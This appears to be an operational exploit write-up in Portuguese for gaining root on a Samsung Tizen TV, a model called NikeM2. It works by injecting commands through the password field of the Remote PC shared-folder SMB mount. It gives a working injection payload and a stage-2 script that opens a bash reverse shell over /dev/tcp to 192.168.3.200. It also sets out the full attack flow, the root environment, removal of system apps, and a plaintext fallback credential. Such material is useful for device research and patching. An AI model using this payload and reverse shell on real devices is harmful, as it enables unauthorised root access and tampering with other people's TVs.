# Root via Remote PC/CIFS — NikeM2 (Tizen 6.0, fw 2301)

## Vulnerabilidade

O fluxo **Remote PC → Shared Folder** do Tizen passa `username`/`password` para um
script privilegiado de mount SMB que os interpola num `/bin/bash -c` sem sanitização.
Comando injetado no campo senha executa como **`uid=0(root)`, contexto `System::Privileged`**.

Fonte: pesquisa `tiz0wn` (`remotepc-cifs-root`).

## Descobertas de injeção

| Vetor | Resultado |
|---|---|
| `password` com `$(cmd)` | **FUNCIONA** — avaliado pelo bash |
| `username` com `$(cmd)` | também avaliado |
| `smbpath`/nome do compartilhamento `x$(nc ...)` | NÃO — abre a pasta normalmente |
| Espaços no payload | viram vírgulas (rewrite do mount `-o user=,pass=`) → payload não pode ter espaço |
| `/dev/tcp/IP/PORT` | funciona (bash builtin) |
| AppInstall/SDB `tpk` (SVE-2025-50109) | patchado no fw 2301 — metacaracteres rejeitados |

## Payload que funcionou

Senha do perfil Remote PC (Windows + TV):

```
$(/bin/bash</home/owner/share/r)
```

Sem espaços. `/home/owner/share/r` = stage-2 (persiste na partição `/opt` → sobrevive reboot):

```sh
#!/bin/bash
echo STAGE2-OK >/dev/tcp/192.168.3.200/9999
/bin/bash -i >& /dev/tcp/192.168.3.200/9998 0>&1
```

## Fluxo completo

1. PC: `kit\listener.py` (9998/9999) + `kit\bridge.py` (9997 controle ↔ 9998 shell)
2. Windows: RDP habilitado (ver `setup-rdp.ps1`), senha do usuário = payload
3. TV: Remote PC → conecta `192.168.3.200` → toolbar → **Shared Folder**
4. O mount evalua a senha → `STAGE2-OK` na 9999 → shell root na 9998
5. Comandos via canal de controle 9997 (a sessão SMB fica travada — normal)

## Ambiente root

```
uid=0(root) gid=0(root) context="System::Privileged"
Linux Samsung 4.1.10 #1 SMP PREEMPT armv7l
/            vdfs  ro  (write-protected em hardware — mount -o remount,rw falha)
/opt         vdfs  rw  ← apps de usuário, /home/owner/share
/mnt/systemrw vdfs rw
/factory_peq squashfs ro
```

- `pkgcmd`/`pkginfo` presentes em `/usr/bin` — aceitam remover apps de sistema como root
- Remoções persistem (package manager), mas não é trivial reinstalar (sem o .tpk/.wgt original; só via factory reset ou store)

## Notas operacionais

- Comandos curtos; a saída do shell tem artefatos de edição de linha — filtrar por `key[end] val[ok]`/`error`
- O shell morre se a sessão RDP cair ou a TV reiniciar — re-injetar via Shared Folder
- Não usar a senha-payload na conta principal sem conta de emergência admin (`tvrdp`/`Tv12345!`)
